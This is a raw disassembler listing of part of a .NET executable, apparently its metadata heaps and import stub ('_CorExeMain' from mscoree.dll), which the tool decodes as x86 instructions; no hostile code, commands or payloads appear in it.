  4090e5:	5f                   	pop    %edi
  4090e6:	49                   	dec    %ecx
  4090e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e8:	73 74                	jae    0x40915e
  4090ea:	61                   	popa
  4090eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ec:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  4090ef:	5f                   	pop    %edi
  4090f0:	13 44 69 73          	adc    0x73(%ecx,%ebp,2),%eax
  4090f4:	70 6f                	jo     0x409165
  4090f6:	73 65                	jae    0x40915d
  4090f8:	5f                   	pop    %edi
  4090f9:	5f                   	pop    %edi
  4090fa:	49                   	dec    %ecx
  4090fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4090fc:	73 74                	jae    0x409172
  4090fe:	61                   	popa
  4090ff:	6e                   	outsb  %ds:(%esi),(%dx)
  409100:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  409103:	5f                   	pop    %edi
  409104:	00 00                	add    %al,(%eax)
  409106:	00 06                	add    %al,(%esi)
  409108:	15 12 18 01 13       	adc    $0x13011812,%eax
  40910d:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409110:	01 13                	add    %edx,(%ebx)
  409112:	00 04 07             	add    %al,(%edi,%eax,1)
  409115:	01 13                	add    %edx,(%ebx)
  409117:	00 04 20             	add    %al,(%eax,%eiz,1)
  40911a:	01 01                	add    %eax,(%ecx)
  40911c:	02 05 01 00 00 00    	add    0x1,%al
  409122:	00 04 00             	add    %al,(%eax,%eax,1)
  409125:	01 08                	add    %ecx,(%eax)
  409127:	0e                   	push   %cs
  409128:	05 20 02 01 1c       	add    $0x1c010220,%eax
  40912d:	18 08                	sbb    %cl,(%eax)
  40912f:	20 02                	and    %al,(%edx)
  409131:	12 29                	adc    (%ecx),%ch
  409133:	12 80 89 1c 05 20    	adc    0x20051c89(%eax),%al
  409139:	01 01                	add    %eax,(%ecx)
  40913b:	12 29                	adc    (%ecx),%ch
  40913d:	31 01                	xor    %eax,(%ecx)
  40913f:	00 12                	add    %dl,(%edx)
  409141:	3c 67                	cmp    $0x67,%al
  409143:	65 6e                	outsb  %gs:(%esi),(%dx)
  409145:	65 72 61             	gs jb  0x4091a9
  409148:	74 65                	je     0x4091af
  40914a:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  40914e:	74 68                	je     0x4091b8
  409150:	6f                   	outsl  %ds:(%esi),(%dx)
  409151:	64 3e 01 00          	fs add %eax,%ds:(%eax)
  409155:	54                   	push   %esp
  409156:	0e                   	push   %cs
  409157:	04 54                	add    $0x54,%al
  409159:	79 70                	jns    0x4091cb
  40915b:	65 12 3c 67          	adc    %gs:(%edi,%eiz,2),%bh
  40915f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409161:	65 72 61             	gs jb  0x4091c5
  409164:	74 65                	je     0x4091cb
  409166:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  40916a:	74 68                	je     0x4091d4
  40916c:	6f                   	outsl  %ds:(%esi),(%dx)
  40916d:	64 3e 04 00          	fs ds add $0x0,%al
  409171:	01 01                	add    %eax,(%ecx)
  409173:	08 04 00             	or     %al,(%eax,%eax,1)
  409176:	01 0e                	add    %ecx,(%esi)
  409178:	1c 06                	sbb    $0x6,%al
  40917a:	00 01                	add    %al,(%ecx)
  40917c:	01 12                	add    %edx,(%edx)
  40917e:	80 95 06 20 01 01 12 	adcb   $0x12,0x1012006(%ebp)
  409185:	80 a1 09 07 03 12 2d 	andb   $0x2d,0x12030709(%ecx)
  40918c:	12 2d 12 80 95 05    	adc    0x5958012,%ch
  409192:	20 02                	and    %al,(%edx)
  409194:	08 08                	or     %cl,(%eax)
  409196:	08 03                	or     %al,(%ebx)
  409198:	20 00                	and    %al,(%eax)
  40919a:	02 06                	add    (%esi),%al
  40919c:	20 01                	and    %al,(%ecx)
  40919e:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  4091a3:	20 01                	and    %al,(%ecx)
  4091a5:	08 08                	or     %cl,(%eax)
  4091a7:	07                   	pop    %es
  4091a8:	00 01                	add    %al,(%ecx)
  4091aa:	1d 12 80 ad 0e       	sbb    $0xead8012,%eax
  4091af:	16                   	push   %ss
  4091b0:	07                   	pop    %es
  4091b1:	08 0e                	or     %cl,(%esi)
  4091b3:	1d 12 80 ad 12       	sbb    $0x12ad8012,%eax
  4091b8:	80 ad 12 80 95 1d 03 	subb   $0x3,0x1d958012(%ebp)
  4091bf:	1d 03 08 1d 12       	sbb    $0x121d0803,%eax
  4091c4:	80 ad 0c 20 03 01 11 	subb   $0x11,0x103200c(%ebp)
  4091cb:	80 c1 11             	add    $0x11,%cl
  4091ce:	80 c5 11             	add    $0x11,%ch
  4091d1:	80 c9 04             	or     $0x4,%cl
  4091d4:	20 01                	and    %al,(%ecx)
  4091d6:	01 08                	add    %ecx,(%eax)
  4091d8:	05 20 02 01 0e       	add    $0xe010220,%eax
  4091dd:	08 0f                	or     %cl,(%edi)
  4091df:	20 06                	and    %al,(%esi)
  4091e1:	12 29                	adc    (%ecx),%ch
  4091e3:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  4091e8:	80 d1 12             	adc    $0x12,%cl
  4091eb:	80 89 1c 09 20 04 01 	orb    $0x1,0x420091c(%ecx)
  4091f2:	12 80 bd 1c 08 08    	adc    0x8081cbd(%eax),%al
  4091f8:	09 07                	or     %eax,(%edi)
  4091fa:	03 1c 12             	add    (%edx,%edx,1),%ebx
  4091fd:	80 bd 12 80 95 05 20 	cmpb   $0x20,0x5958012(%ebp)
  409204:	02 0e                	add    (%esi),%cl
  409206:	0e                   	push   %cs
  409207:	0e                   	push   %cs
  409208:	05 00 00 12 80       	add    $0x80120000,%eax
  40920d:	dd 05 00 02 0e 0e    	fldl   0xe0e0200
  409213:	0e                   	push   %cs
  409214:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  409219:	1c 09                	sbb    $0x9,%al
  40921b:	07                   	pop    %es
  40921c:	04 1c                	add    $0x1c,%al
  40921e:	12 80 d9 02 1d 1c    	adc    0x1c1d02d9(%eax),%al
  409224:	05 20 00 11 80       	add    $0x80110020,%eax
  409229:	e9 04 20 01 0e       	jmp    0xe41b232
  40922e:	0e                   	push   %cs
  40922f:	0c 07                	or     $0x7,%al
  409231:	04 0e                	add    $0xe,%al
  409233:	12 80 e5 12 80 95    	adc    -0x6a7fed1b(%eax),%al
  409239:	11 80 e9 06 00 03    	adc    %eax,0x30006e9(%eax)
  40923f:	08 0e                	or     %cl,(%esi)
  409241:	0e                   	push   %cs
  409242:	02 06                	add    (%esi),%al
  409244:	07                   	pop    %es
  409245:	02 0e                	add    (%esi),%cl
  409247:	12 80 95 05 00 00    	adc    0x595(%eax),%al
  40924d:	12 80 f9 06 20 01    	adc    0x12006f9(%eax),%al
  409253:	01 12                	add    %edx,(%edx)
  409255:	80 f9 06             	cmp    $0x6,%cl
  409258:	20 01                	and    %al,(%ecx)
  40925a:	02 11                	add    (%ecx),%dl
  40925c:	81 01 07 07 03 0e    	addl   $0xe030707,(%ecx)
  409262:	12 80 95 02 06 00    	adc    0x60295(%eax),%al
  409268:	03 0e                	add    (%esi),%ecx
  40926a:	0e                   	push   %cs
  40926b:	0e                   	push   %cs
  40926c:	0e                   	push   %cs
  40926d:	05 20 00 12 81       	add    $0x81120020,%eax
  409272:	0d 05 20 00 12       	or     $0x12002005,%eax
  409277:	81 11 05 20 00 12    	adcl   $0x12002005,(%ecx)
  40927d:	81 09 04 20 01 1c    	orl    $0x1c012004,(%ecx)
  409283:	0e                   	push   %cs
  409284:	05 20 01 12 39       	add    $0x39120120,%eax
  409289:	0e                   	push   %cs
  40928a:	05 20 02 0e 08       	add    $0x80e0220,%eax
  40928f:	08 11                	or     %dl,(%ecx)
  409291:	07                   	pop    %es
  409292:	06                   	push   %es
  409293:	0e                   	push   %cs
  409294:	12 81 05 12 39 12    	adc    0x12391205(%ecx),%al
  40929a:	81 09 12 80 95 12    	orl    $0x12958012,(%ecx)
  4092a0:	81 11 06 20 01 01    	adcl   $0x1012006,(%ecx)
  4092a6:	12 81 19 05 00 02    	adc    0x2000519(%ecx),%al
  4092ac:	1c 1c                	sbb    $0x1c,%al
  4092ae:	1c 10                	sbb    $0x10,%al
  4092b0:	07                   	pop    %es
  4092b1:	06                   	push   %es
  4092b2:	0e                   	push   %cs
  4092b3:	12 81 19 12 81 05    	adc    0x5811219(%ecx),%al
  4092b9:	0e                   	push   %cs
  4092ba:	12 81 1d 12 81 11    	adc    0x1181121d(%ecx),%al
  4092c0:	09 07                	or     %eax,(%edi)
  4092c2:	03 0e                	add    (%esi),%ecx
  4092c4:	12 81 1d 12 80 95    	adc    -0x6a7fede3(%ecx),%al
  4092ca:	05 20 00 12 80       	add    $0x80120020,%eax
  4092cf:	d9 03                	flds   (%ebx)
  4092d1:	20 00                	and    %al,(%eax)
  4092d3:	0b 04 00             	or     (%eax,%eax,1),%eax
  4092d6:	01 0d 1c 04 00 01    	add    %ecx,0x100041c
  4092dc:	0d 0d 09 07 05       	or     $0x507090d,%eax
  4092e1:	0e                   	push   %cs
  4092e2:	0a 0e                	or     (%esi),%cl
  4092e4:	12 80 95 0d 05 20    	adc    0x20050d95(%eax),%al
  4092ea:	01 08                	add    %ecx,(%eax)
  4092ec:	12 29                	adc    (%ecx),%ch
  4092ee:	04 20                	add    $0x20,%al
  4092f0:	00 1d 05 04 00 01    	add    %bl,0x1000405
  4092f6:	0a 0e                	or     (%esi),%cl
  4092f8:	04 20                	add    $0x20,%al
  4092fa:	01 01                	add    %eax,(%ecx)
  4092fc:	05 07 20 03 01       	add    $0x1032007,%eax
  409301:	1d 05 08 08 03       	sbb    $0x3080805,%eax
  409306:	20 00                	and    %al,(%eax)
  409308:	0a 06                	or     (%esi),%al
  40930a:	20 01                	and    %al,(%ecx)
  40930c:	01 12                	add    %edx,(%edx)
  40930e:	81 39 11 00 08 1c    	cmpl   $0x1c080011,(%ecx)
  409314:	1c 12                	sbb    $0x12,%al
  409316:	15 0e 1d 1c 1d       	adc    $0x1d1c1d0e,%eax
  40931b:	0e                   	push   %cs
  40931c:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  409321:	02 09                	add    (%ecx),%cl
  409323:	07                   	pop    %es
  409324:	04 08                	add    $0x8,%al
  409326:	1c 12                	sbb    $0x12,%al
  409328:	80 95 1d 1c 05 07 01 	adcb   $0x1,0x7051c1d(%ebp)
  40932f:	12 80 95 06 00 02    	adc    0x2000695(%eax),%al
  409335:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  409338:	02 07                	add    (%edi),%al
  40933a:	20 02                	and    %al,(%edx)
  40933c:	02 08                	add    (%eax),%cl
  40933e:	11 81 49 0d 07 06    	adc    %eax,0x6070d49(%ecx)
  409344:	12 1d 1d 05 1d 05    	adc    0x51d051d,%bl
  40934a:	12 80 95 1c 02 0e    	adc    0xe021c95(%eax),%al
  409350:	07                   	pop    %es
  409351:	04 12                	add    $0x12,%al
  409353:	80 95 12 80 95 12 80 	adcb   $0x80,0x12958012(%ebp)
  40935a:	95                   	xchg   %eax,%ebp
  40935b:	12 80 95 05 00 01    	adc    0x1000595(%eax),%al
  409361:	0e                   	push   %cs
  409362:	1d 0e 07 07 02       	sbb    $0x207070e,%eax
  409367:	12 80 95 1d 0e 02    	adc    0x20e1d95(%eax),%al
  40936d:	1d 05 0a 00 04       	sbb    $0x4000a05,%eax
  409372:	1d 0e 0e 0e 08       	sbb    $0x80e0e0e,%eax
  409377:	11 81 69 06 20 01    	adc    %eax,0x1200669(%ecx)
  40937d:	01 11                	add    %edx,(%ecx)
  40937f:	81 71 04 00 01 01 02 	xorl   $0x2010100,0x4(%ecx)
  409386:	06                   	push   %es
  409387:	00 01                	add    %al,(%ecx)
  409389:	01 11                	add    %edx,(%ecx)
  40938b:	81 7d 06 00 01 12 81 	cmpl   $0x81120100,0x6(%ebp)
  409392:	81 0e 09 00 04 08    	orl    $0x8040009,(%esi)
  409398:	0e                   	push   %cs
  409399:	11 81 89 02 08 04    	adc    %eax,0x4080289(%ecx)
  40939f:	20 01                	and    %al,(%ecx)
  4093a1:	01 1c 06             	add    %ebx,(%esi,%eax,1)
  4093a4:	00 01                	add    %al,(%ecx)
  4093a6:	0e                   	push   %cs
  4093a7:	11 81 8d 05 00 02    	adc    %eax,0x200058d(%ecx)
  4093ad:	01 0e                	add    %ecx,(%esi)
  4093af:	0e                   	push   %cs
  4093b0:	05 20 00 12 81       	add    $0x81120020,%eax
  4093b5:	95                   	xchg   %eax,%ebp
  4093b6:	05 20 00 12 81       	add    $0x81120020,%eax
  4093bb:	99                   	cltd
  4093bc:	05 00 00 12 81       	add    $0x81120000,%eax
  4093c1:	9d                   	popf
  4093c2:	05 20 00 11 81       	add    $0x81110020,%eax
  4093c7:	5d                   	pop    %ebp
  4093c8:	08 20                	or     %ah,(%eax)
  4093ca:	03 01                	add    (%ecx),%eax
  4093cc:	08 08                	or     %cl,(%eax)
  4093ce:	11 81 a1 08 00 01    	adc    %eax,0x10008a1(%ecx)
  4093d4:	12 81 55 12 81 a5    	adc    -0x5a7eedab(%ecx),%al
  4093da:	05 20 02 01 08       	add    $0x8010220,%eax
  4093df:	08 0d 20 06 01 08    	or     %cl,0x8010620
  4093e5:	08 08                	or     %cl,(%eax)
  4093e7:	08 11                	or     %dl,(%ecx)
  4093e9:	81 59 11 81 a9 07 20 	sbbl   $0x2007a981,0x11(%ecx)
  4093f0:	04 01                	add    $0x1,%al
  4093f2:	08 08                	or     %cl,(%eax)
  4093f4:	08 08                	or     %cl,(%eax)
  4093f6:	0f 20 04             	mov    %cr0,%esp
  4093f9:	01 12                	add    %edx,(%edx)
  4093fb:	81 a5 11 81 5d 11 81 	andl   $0x81115d81,0x115d8111(%ebp)
  409402:	5d 11 81 
  409405:	ad                   	lods   %ds:(%esi),%eax
  409406:	05 00 00 12 81       	add    $0x81120000,%eax
  40940b:	b1 09                	mov    $0x9,%cl
  40940d:	20 02                	and    %al,(%edx)
  40940f:	01 12                	add    %edx,(%edx)
  409411:	81 35 12 81 b1 43 07 	xorl   $0xe1d1907,0x43b18112
  409418:	19 1d 0e 
  40941b:	0e                   	push   %cs
  40941c:	12 81 51 12 80 95    	adc    -0x6a7fedaf(%ecx),%al
  409422:	12 80 95 12 80 95    	adc    -0x6a7fed6b(%eax),%al
  409428:	12 80 95 0e 12 80    	adc    -0x7fedf16b(%eax),%al
  40942e:	95                   	xchg   %eax,%ebp
  40942f:	1d 05 12 81 55       	sbb    $0x55811205,%eax
  409434:	11 81 59 11 81 5d    	adc    %eax,0x5d811159(%ecx)
  40943a:	12 81 55 12 81 61    	adc    0x61811255(%ecx),%al
  409440:	12 1d 12 81 61 12    	adc    0x12618112,%bl
  409446:	80 95 12 80 95 0e 1d 	adcb   $0x1d,0xe958012(%ebp)
  40944d:	0e                   	push   %cs
  40944e:	11 81 5d 11 81 5d    	adc    %eax,0x5d81115d(%ecx)
  409454:	11 81 5d 11 81 5d    	adc    %eax,0x5d81115d(%ecx)
  40945a:	05 00 00 12 81       	add    $0x81120000,%eax
  40945f:	b9 07 20 01 12       	mov    $0x12012007,%ecx
  409464:	81 bd 1d 05 05 20 00 	cmpl   $0x15121d00,0x2005051d(%ebp)
  40946b:	1d 12 15 
  40946e:	06                   	push   %es
  40946f:	20 00                	and    %al,(%eax)
  409471:	1d 12 81 b5 10       	sbb    $0x10b58112,%eax
  409476:	00 07                	add    %al,(%edi)
  409478:	1c 1c                	sbb    $0x1c,%al
  40947a:	12 15 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dl
  409480:	0e                   	push   %cs
  409481:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  409486:	06                   	push   %es
  409487:	00 03                	add    %al,(%ebx)
  409489:	02 1c 1c             	add    (%esp,%ebx,1),%bl
  40948c:	02 04 20             	add    (%eax,%eiz,1),%al
  40948f:	01 02                	add    %eax,(%edx)
  409491:	0e                   	push   %cs
  409492:	16                   	push   %ss
  409493:	07                   	pop    %es
  409494:	0a 12                	or     (%edx),%dl
  409496:	15 1c 0e 12 80       	adc    $0x80120e1c,%eax
  40949b:	95                   	xchg   %eax,%ebp
  40949c:	08 1d 12 15 08 1d    	or     %bl,0x1d081512
  4094a2:	12 81 b5 1d 1c 1d    	adc    0x1d1c1db5(%ecx),%al
  4094a8:	1c 05                	sbb    $0x5,%al
  4094aa:	00 01                	add    %al,(%ecx)
  4094ac:	11 35 0d 04 20 00    	adc    %esi,0x20040d
  4094b2:	11 35 07 00 02 02    	adc    %esi,0x2020007
  4094b8:	11 35 11 35 14 07    	adc    %esi,0x7143511
  4094be:	09 12                	or     %edx,(%edx)
  4094c0:	44                   	inc    %esp
  4094c1:	12 81 c9 08 11 35    	adc    0x351108c9(%ecx),%al
  4094c7:	12 2d 08 12 80 95    	adc    0x95801208,%ch
  4094cd:	1d 03 1d 0e 06       	sbb    $0x60e1d03,%eax
  4094d2:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  4094d7:	0e                   	push   %cs
  4094d8:	05 20 01 01 13       	add    $0x13010120,%eax
  4094dd:	00 06                	add    %al,(%esi)
  4094df:	00 00                	add    %al,(%eax)
  4094e1:	1d 12 81 81 07       	sbb    $0x7818112,%eax
  4094e6:	15 12 81 d1 02       	adc    $0x2d18112,%eax
  4094eb:	0e                   	push   %cs
  4094ec:	02 13                	add    (%ebx),%dl
  4094ee:	10 01                	adc    %al,(%ecx)
  4094f0:	02 02                	add    (%edx),%al
  4094f2:	15 12 81 d9 01       	adc    $0x1d98112,%eax
  4094f7:	1e                   	push   %ds
  4094f8:	00 15 12 81 d1 02    	add    %dl,0x2d18112
  4094fe:	1e                   	push   %ds
  4094ff:	00 02                	add    %al,(%edx)
  409501:	03 0a                	add    (%edx),%ecx
  409503:	01 0e                	add    %ecx,(%esi)
  409505:	15 07 08 08 1c       	adc    $0x1c080807,%eax
  40950a:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  40950f:	0e                   	push   %cs
  409510:	12 81 81 08 1d 0e    	adc    0xe1d0881(%ecx),%al
  409516:	08 1d 12 81 81 06    	or     %bl,0x6818112
  40951c:	00 01                	add    %al,(%ecx)
  40951e:	12 81 e5 0e 05 20    	adc    0x20050ee5(%ecx),%al
  409524:	00 12                	add    %dl,(%edx)
  409526:	81 e9 08 07 02 12    	sub    $0x12020708,%ecx
  40952c:	81 dd 12 81 e1 09    	sbb    $0x9e18112,%ebp
  409532:	07                   	pop    %es
  409533:	05 02 08 0e 12       	add    $0x120e0802,%eax
  409538:	80 95 0e 06 20 01 01 	adcb   $0x1,0x120060e(%ebp)
  40953f:	11 81 f1 08 00 01    	adc    %eax,0x10008f1(%ecx)
  409545:	12 81 81 12 81 ed    	adc    -0x127eed7f(%ecx),%al
  40954b:	0f 07                	sysret
  40954d:	06                   	push   %es
  40954e:	1c 12                	sbb    $0x12,%al
  409550:	81 81 12 81 ed 1d 1c 	addl   $0x1d1c1d1c,0x1ded8112(%ecx)
  409557:	1d 1c 1d 
  40955a:	02 05 20 00 12 81    	add    0x81120020,%al
  409560:	b5 06                	mov    $0x6,%ch
  409562:	20 00                	and    %al,(%eax)
  409564:	1d 12 81 f9 06       	sbb    $0x6f98112,%eax
  409569:	20 02                	and    %al,(%edx)
  40956b:	1c 1c                	sbb    $0x1c,%al
  40956d:	1d 1c 0f 07 06       	sbb    $0x6070f1c,%eax
  409572:	1c 12                	sbb    $0x12,%al
  409574:	81 bd 1c 12 81 b5 1d 	cmpl   $0x80121c1d,-0x4a7eede4(%ebp)
  40957b:	1c 12 80 
  40957e:	95                   	xchg   %eax,%ebp
  40957f:	05 00 00 12 81       	add    $0x81120000,%eax
  409584:	fd                   	std
  409585:	05 20 01 1d 05       	add    $0x51d0120,%eax
  40958a:	0e                   	push   %cs
  40958b:	0a 20                	or     (%eax),%ah
  40958d:	04 08                	add    $0x8,%al
  40958f:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  409594:	80 d1 0c             	adc    $0xc,%cl
  409597:	07                   	pop    %es
  409598:	05 1d 05 0e 12       	add    $0x120e051d,%eax
  40959d:	19 12                	sbb    %edx,(%edx)
  40959f:	80 95 1d 0e 06 20 01 	adcb   $0x1,0x20060e1d(%ebp)
  4095a6:	01 11                	add    %edx,(%ecx)
  4095a8:	82 09 01             	orb    $0x1,(%ecx)
  4095ab:	22 0f                	and    (%edi),%cl
  4095ad:	07                   	pop    %es
  4095ae:	05 12 80 95 0e       	add    $0xe958012,%eax
  4095b3:	12 82 0d 12 80 95    	adc    -0x6a7fedf3(%edx),%al
  4095b9:	12 81 ed 06 20 01    	adc    0x12006ed(%ecx),%al
  4095bf:	1d 05 1d 05 0c       	sbb    $0xc051d05,%eax
  4095c4:	00 05 01 12 82 25    	add    %al,0x25821201
  4095ca:	08 12                	or     %dl,(%edx)
  4095cc:	82 25 08 08 05 20 01 	andb   $0x1,0x20050808
  4095d3:	01 1d 05 06 20 01    	add    %ebx,0x1200605
  4095d9:	01 11                	add    %edx,(%ecx)
  4095db:	82 2d 05 20 00 12 82 	subb   $0x82,0x12002005
  4095e2:	19 08                	sbb    %ecx,(%eax)
  4095e4:	20 03                	and    %al,(%ebx)
  4095e6:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  4095eb:	08 13                	or     %dl,(%ebx)
  4095ed:	07                   	pop    %es
  4095ee:	08 12                	or     %dl,(%edx)
  4095f0:	82 15 1d 05 1c 0e 12 	adcb   $0x12,0xe1c051d
  4095f7:	82 19 1d             	sbbb   $0x1d,(%ecx)
  4095fa:	05 12 82 1d 1d       	add    $0x1d1d8212,%eax
  4095ff:	05 05 00 00 12       	add    $0x12000005,%eax
  409604:	81 81 05 20 00 12 82 	addl   $0x20043182,0x12002005(%ecx)
  40960b:	31 04 20 
  40960e:	01 01                	add    %eax,(%ecx)
  409610:	0a 04 07             	or     (%edi,%eax,1),%al
  409613:	01 1d 0e 06 00 01    	add    %ebx,0x100060e
  409619:	11 82 39 0e 04 20    	adc    %eax,0x20040e39(%edx)
  40961f:	01 03                	add    %eax,(%ebx)
  409621:	08 05 20 01 12 39    	or     %al,0x39120120
  409627:	03 07                	add    (%edi),%eax
  409629:	07                   	pop    %es
  40962a:	04 0e                	add    $0xe,%al
  40962c:	12 39                	adc    (%ecx),%bh
  40962e:	08 08                	or     %cl,(%eax)
  409630:	06                   	push   %es
  409631:	10 01                	adc    %al,(%ecx)
  409633:	01 08                	add    %ecx,(%eax)
  409635:	1e                   	push   %ds
  409636:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409639:	01 11                	add    %edx,(%ecx)
  40963b:	38 06                	cmp    %al,(%esi)
  40963d:	20 01                	and    %al,(%ecx)
  40963f:	11 35 11 35 04 07    	adc    %esi,0x7043511
  409645:	02 1c 08             	add    (%eax,%ecx,1),%bl
  409648:	06                   	push   %es
  409649:	07                   	pop    %es
  40964a:	03 0e                	add    (%esi),%ecx
  40964c:	12 39                	adc    (%ecx),%bh
  40964e:	18 04 07             	sbb    %al,(%edi,%eax,1)
  409651:	01 1d 05 05 20 01    	add    %ebx,0x1200505
  409657:	0e                   	push   %cs
  409658:	1d 05 05 07 02       	sbb    $0x2070505,%eax
  40965d:	0e                   	push   %cs
  40965e:	1d 1c 0e 07 07       	sbb    $0x7070e1c,%eax
  409663:	1d 05 0e 12 82       	sbb    $0x82120e05,%eax
  409668:	1d 12 39 05 08       	sbb    $0x8053912,%eax
  40966d:	1d 05 04 06 12       	sbb    $0x12060405,%eax
  409672:	81 99 09 20 02 12 81 	sbbl   $0x110e9981,0x12022009(%ecx)
  409679:	99 0e 11 
  40967c:	82 4d 08 20          	orb    $0x20,0x8(%ebp)
  409680:	03 01                	add    (%ecx),%eax
  409682:	0e                   	push   %cs
  409683:	1c 11                	sbb    $0x11,%al
  409685:	82 51 09 07          	adcb   $0x7,0x9(%ecx)
  409689:	03 02                	add    (%edx),%eax
  40968b:	12 81 99 12 80 95    	adc    -0x6a7fed67(%ecx),%al
  409691:	06                   	push   %es
  409692:	20 01                	and    %al,(%ecx)
  409694:	12 81 99 0e 0b 07    	adc    0x70b0e99(%ecx),%al
  40969a:	04 1d                	add    $0x1d,%al
  40969c:	05 12 81 99 1c       	add    $0x1c998112,%eax
  4096a1:	12 80 95 06 00 02    	adc    0x2000695(%eax),%al
  4096a7:	1c 1c                	sbb    $0x1c,%al
  4096a9:	12 15 06 00 02 08    	adc    0x8020006,%dl
  4096af:	1d 05 08 09 20       	sbb    $0x20090805,%eax
  4096b4:	02 01                	add    (%ecx),%al
  4096b6:	12 81 35 11 82 5d    	adc    0x5d821135(%ecx),%al
  4096bc:	04 00                	add    $0x0,%al
  4096be:	01 08                	add    %ecx,(%eax)
  4096c0:	1c 10                	sbb    $0x10,%al
  4096c2:	07                   	pop    %es
  4096c3:	09 1d 05 1c 1c 1d    	or     %ebx,0x1d1c1c05
  4096c9:	05 1c 1c 1d 1c       	add    $0x1c1d1c1c,%eax
  4096ce:	1d 1c 1d 02 05       	sbb    $0x5021d1c,%eax
  4096d3:	00 01                	add    %al,(%ecx)
  4096d5:	1d 05 08 0d 07       	sbb    $0x70d0805,%eax
  4096da:	07                   	pop    %es
  4096db:	1d 05 1c 1c 1c       	sbb    $0x1c1c1c05,%eax
  4096e0:	1d 1c 1d 1c 1d       	sbb    $0x1d1c1d1c,%eax
  4096e5:	02 12                	add    (%edx),%dl
  4096e7:	07                   	pop    %es
  4096e8:	06                   	push   %es
  4096e9:	12 82 15 1d 05 12    	adc    0x12051d15(%edx),%al
  4096ef:	82 1d 1d 05 12 82 19 	sbbb   $0x19,0x8212051d
  4096f6:	12 80 95 07 20 03    	adc    0x3200795(%eax),%al
  4096fc:	01 02                	add    %eax,(%edx)
  4096fe:	0e                   	push   %cs
  4096ff:	10 02                	adc    %al,(%edx)
  409701:	04 07                	add    $0x7,%al
  409703:	02 02                	add    (%edx),%al
  409705:	02 06                	add    (%esi),%al
  409707:	20 01                	and    %al,(%ecx)
  409709:	01 11                	add    %edx,(%ecx)
  40970b:	82 65 01 08          	andb   $0x8,0x1(%ebp)
  40970f:	08 01                	or     %al,(%ecx)
  409711:	00 08                	add    %cl,(%eax)
  409713:	00 00                	add    %al,(%eax)
  409715:	00 00                	add    %al,(%eax)
  409717:	00 1e                	add    %bl,(%esi)
  409719:	01 00                	add    %eax,(%eax)
  40971b:	01 00                	add    %eax,(%eax)
  40971d:	54                   	push   %esp
  40971e:	02 16                	add    (%esi),%dl
  409720:	57                   	push   %edi
  409721:	72 61                	jb     0x409784
  409723:	70 4e                	jo     0x409773
  409725:	6f                   	outsl  %ds:(%esi),(%dx)
  409726:	6e                   	outsb  %ds:(%esi),(%dx)
  409727:	45                   	inc    %ebp
  409728:	78 63                	js     0x40978d
  40972a:	65 70 74             	gs jo  0x4097a1
  40972d:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  409734:	77 73                	ja     0x4097a9
  409736:	01 29                	add    %ebp,(%ecx)
  409738:	01 00                	add    %eax,(%eax)
  40973a:	24 34                	and    $0x34,%al
  40973c:	62 37                	bound  %esi,(%edi)
  40973e:	33 39                	xor    (%ecx),%edi
  409740:	61                   	popa
  409741:	66 65 2d 32 63       	gs sub $0x6332,%ax
  409746:	65 32 2d 34 34 32 30 	xor    %gs:0x30323434,%ch
  40974d:	2d 62 36 32 31       	sub    $0x31323662,%eax
  409752:	2d 61 33 35 31       	sub    $0x31353361,%eax
  409757:	63 33                	arpl   %esi,(%ebx)
  409759:	62 66 30             	bound  %esp,0x30(%esi)
  40975c:	38 66 36             	cmp    %ah,0x36(%esi)
  40975f:	00 00                	add    %al,(%eax)
  409761:	0c 01                	or     $0x1,%al
  409763:	00 07                	add    %al,(%edi)
  409765:	31 2e                	xor    %ebp,(%esi)
  409767:	30 2e                	xor    %ch,(%esi)
  409769:	30 2e                	xor    %ch,(%esi)
  40976b:	30 00                	xor    %al,(%eax)
  40976d:	00 00                	add    %al,(%eax)
  40976f:	00 98 97 00 00 00    	add    %bl,0x97(%eax)
  409775:	00 00                	add    %al,(%eax)
  409777:	00 00                	add    %al,(%eax)
  409779:	00 00                	add    %al,(%eax)
  40977b:	00 ae 97 00 00 00    	add    %ch,0x97(%esi)
  409781:	20 00                	and    %al,(%eax)
	...
  409797:	00 a0 97 00 00 00    	add    %ah,0x97(%eax)
  40979d:	00 00                	add    %al,(%eax)
  40979f:	00 00                	add    %al,(%eax)
  4097a1:	00 5f 43             	add    %bl,0x43(%edi)
  4097a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4097a5:	72 45                	jb     0x4097ec
  4097a7:	78 65                	js     0x40980e
  4097a9:	4d                   	dec    %ebp
  4097aa:	61                   	popa
  4097ab:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4097b2:	72 65                	jb     0x409819
  4097b4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  4097b8:	6c                   	insb   (%dx),%es:(%edi)
  4097b9:	00 00                	add    %al,(%eax)
  4097bb:	00 00                	add    %al,(%eax)
  4097bd:	00 ff                	add    %bh,%bh
  4097bf:	25 00 20 40 00       	and    $0x402000,%eax
